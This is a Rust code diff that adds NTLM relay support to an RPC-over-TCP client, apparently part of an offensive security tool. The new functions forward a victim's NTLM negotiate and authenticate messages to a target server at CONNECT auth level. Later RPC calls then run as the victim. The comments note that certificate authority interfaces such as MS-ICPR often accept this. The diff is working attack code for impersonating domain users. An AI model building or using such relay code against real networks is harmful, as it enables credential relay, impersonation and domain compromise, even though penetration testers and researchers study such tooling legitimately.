@@ -11,6 +11,10 @@ pub struct RpcTcp {
     call_id: u32,
     seal: Option<SealState>,
     session_key: Option<[u8; 16]>,
+    /// The call_id of an in-flight relayed BIND — carried between
+    /// [`bind_relay_start`](RpcTcp::bind_relay_start) and
+    /// [`bind_relay_finish`](RpcTcp::bind_relay_finish).
+    pending_relay_bind: Option<u32>,
 }
 
 impl RpcTcp {
@@ -22,6 +26,7 @@ impl RpcTcp {
             call_id: 1,
             seal: None,
             session_key: None,
+            pending_relay_bind: None,
         })
     }
 
@@ -124,6 +129,53 @@ impl RpcTcp {
         self.send(&auth3).await?;
         self.session_key = Some(exported);
         self.seal = Some(SealState::new(&exported));
+        Ok(())
+    }
+
+    /// Relay-mode BIND, step 1: send the victim's NTLM `Type1` (NEGOTIATE) opaquely and
+    /// return the server's `Type2` (CHALLENGE) for the caller to forward back to the victim.
+    /// Uses auth-level `PKT_CONNECT` (auth-only) — the middle attacker doesn't hold the
+    /// victim's NTLM session key, so per-message signing/sealing cannot be performed.
+    /// Subsequent RPC calls MUST go through [`call`](Self::call) (unsealed).
+    ///
+    /// Whether the target service accepts CONNECT-level auth is a per-interface, per-server
+    /// config: MS-ICPR on many CA hosts does; DRSUAPI on a DC does not.
+    pub async fn bind_relay_start(
+        &mut self,
+        syntax: Syntax,
+        victim_type1: &[u8],
+    ) -> Result<Vec<u8>> {
+        let bind_call_id = self.call_id;
+        self.call_id += 1;
+        let bind = pdu::build_bind_auth_level(
+            bind_call_id,
+            syntax,
+            victim_type1,
+            pdu::RPC_C_AUTHN_LEVEL_PKT_CONNECT,
+        );
+        self.send(&bind).await?;
+        let ack = self.recv().await?;
+        pdu::expect_bind_ack(&ack)?;
+        let type2 = pdu::extract_auth_value(&ack)?;
+        self.pending_relay_bind = Some(bind_call_id);
+        Ok(type2)
+    }
+
+    /// Relay-mode BIND, step 2: send the victim's NTLM `Type3` (AUTHENTICATE) opaquely to
+    /// complete the authentication. After this returns, subsequent [`call`](Self::call)
+    /// requests are made in the victim's context — provided the interface accepts
+    /// CONNECT-level auth (see [`bind_relay_start`](Self::bind_relay_start)).
+    pub async fn bind_relay_finish(&mut self, victim_type3: &[u8]) -> Result<()> {
+        let bind_call_id = self
+            .pending_relay_bind
+            .take()
+            .ok_or_else(|| RpcError::Protocol("bind_relay_finish without _start".into()))?;
+        let auth3 = pdu::build_auth3_level(
+            bind_call_id,
+            victim_type3,
+            pdu::RPC_C_AUTHN_LEVEL_PKT_CONNECT,
+        );
+        self.send(&auth3).await?; // AUTH3 is unacknowledged
         Ok(())
     }
 
